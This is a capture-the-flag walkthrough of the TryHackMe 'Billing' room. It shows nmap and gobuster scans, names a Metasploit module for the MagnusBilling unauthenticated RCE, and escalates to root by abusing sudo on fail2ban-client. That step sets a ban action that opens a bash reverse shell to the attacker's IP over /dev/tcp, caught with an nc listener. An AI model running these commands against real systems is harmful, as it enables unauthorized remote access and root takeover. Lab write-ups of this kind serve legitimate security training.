https://tryhackme.com/room/billing
![[Billing-9.png]]


### Port Scan

[[nmap]] scan
```
┌──(azam㉿kali)-[~]
└─$ nmap -vvv 10.10.125.206         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 14:25 +06
Initiating Ping Scan at 14:25
Scanning 10.10.125.206 [4 ports]
Completed Ping Scan at 14:25, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:25
Completed Parallel DNS resolution of 1 host. at 14:25, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:25
Scanning 10.10.125.206 [1000 ports]
Discovered open port 22/tcp on 10.10.125.206
Discovered open port 80/tcp on 10.10.125.206
Discovered open port 3306/tcp on 10.10.125.206
Completed SYN Stealth Scan at 14:25, 4.50s elapsed (1000 total ports)
Nmap scan report for 10.10.125.206
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2025-04-21 14:25:49 +06 for 5s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.87 seconds
           Raw packets sent: 1023 (44.988KB) | Rcvd: 1013 (40.520KB)
                                                                                                                                       
┌──(azam㉿kali)-[~]
└─$ nmap -T5 -A -p22,80,3306,5038 10.10.125.206                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 14:41 +06
Nmap scan report for 10.10.125.206
Host is up (0.18s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.125.206/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   178.94 ms 10.21.0.1
2   179.12 ms 10.10.125.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds

```

### Directory finding

[[gobuster]] directory scan
```
┌──(azam㉿kali)-[~]
└─$ gobuster dir -u http://10.10.125.206  -x html,txt,php,js,py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.125.206
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,js,py,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/.php                 (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 37]
```

Scan again
```
┌──(azam㉿kali)-[~]
└─$ gobuster dir -u http://10.10.125.206/mbilling/ -x html,txt,php,js,py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.125.206/mbilling/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php,js,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 30760]
/archive              (Status: 301) [Size: 325] [--> http://10.10.125.206/mbilling/archive/]
/resources            (Status: 301) [Size: 327] [--> http://10.10.125.206/mbilling/resources/]
/icons.js             (Status: 200) [Size: 475]
/index.php            (Status: 200) [Size: 663]
/assets               (Status: 301) [Size: 324] [--> http://10.10.125.206/mbilling/assets/]
/lib                  (Status: 301) [Size: 321] [--> http://10.10.125.206/mbilling/lib/]
/tmp                  (Status: 301) [Size: 321] [--> http://10.10.125.206/mbilling/tmp/]
/LICENSE              (Status: 200) [Size: 7652]
/protected            (Status: 403) [Size: 278]
/locale.js            (Status: 200) [Size: 1772]
Progress: 102214 / 1323366 (7.72%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 102214 / 1323366 (7.72%)
===============================================================
Finished
===============================================================
```

### Exploit

From the nmap result we find the search result of 80 port. we search the title and find a exploit
https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/
![[Billing.png]]
exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258

![[Billing-1.png]]

now we should locate our self where we are
![[Billing-2.png]]

Now we should upload a revshell and activate it.
![[Billing-3.png]]
![[Billing-4.png]]
![[Billing-5.png]]

`cat /home/magnus/user.txt` we will find user.txt flag
![[Billing-7.png]]

After we get revshell, we should use 
`suod -l`

![[Billing-6.png]]

we will use a python [[Shell]]

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.21.153.70/9999 0>&1'"
```

open nc for listening
```
nc -lvnp 9999
```

then type this
```
sudo fail2ban-client set sshd banip <any ip>
```


At he end
![[Billing-8.png]]

#ctf #tryhackme_ctf  #tryhackme 

